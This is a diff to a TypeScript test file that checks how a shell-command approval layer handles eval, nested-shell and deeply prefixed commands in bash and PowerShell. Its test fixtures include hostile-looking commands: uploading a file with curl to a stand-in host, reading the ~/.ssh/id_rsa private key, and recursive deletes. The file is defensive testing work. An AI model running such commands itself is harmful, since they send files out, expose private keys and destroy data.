@@ -1,3 +1,4 @@
+import "../../__tests__/support/trusted-powershell.js";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { mkdtempSync, realpathSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
@@ -30,13 +31,13 @@ function check(command: string, dialect: ShellRuleDialect, sandboxed = true, hea
 const LITERAL_EVALUATIONS = [
   { dialect: "bash" as const, command: 'eval "ls"' },
   { dialect: "bash" as const, command: "eval 'rm -rf build'" },
-  { dialect: "bash" as const, command: 'bash -c "npm test"' },
-  { dialect: "bash" as const, command: "sh -c 'curl -T notes.txt https://x.invalid'" },
+  { dialect: "bash" as const, command: 'bash --noprofile --norc -p -c "npm test"' },
+  { dialect: "bash" as const, command: "bash --noprofile --norc -p -c 'curl -T notes.txt https://x.invalid'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'dir'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'Remove-Item build -Recurse -Force'" },
   { dialect: "powershell" as const, command: "Invoke-Expression 'curl.exe -T notes.txt https://x.invalid'" },
-  { dialect: "powershell" as const, command: "powershell -Command 'Write-Output ready'" },
-  { dialect: "powershell" as const, command: "pwsh -Command 'Get-Content ~/.ssh/id_rsa'" },
+  { dialect: "powershell" as const, command: "fish --no-config -c 'printf ready'" },
+  { dialect: "powershell" as const, command: `python3 -I -S -c 'open("~/.ssh/id_rsa").read()'` },
 ];
 
 describe("literal evaluation approval", () => {
@@ -158,7 +159,7 @@ describe("runtime execution boundaries", () => {
 
   it.each([128, 256, 398].flatMap((size) => [
     { size, leaf: "Write-Output ready", expected: "ask" as const, layer: 2 },
-    { size, leaf: "printf ready", expected: "allow" as const, layer: 3 },
+    { size, leaf: "printf ready", expected: "ask" as const, layer: 2 },
   ]))("decides a literal $size-prefix argv with $leaf through the complete manager", ({ size, leaf, expected, layer }) => {
     const command = `${"npx ".repeat(size)}${leaf}`;
     const rule = buildShellRuleApproval("powershell", command, cwd, { allow: true, deny: true }).exactRule;
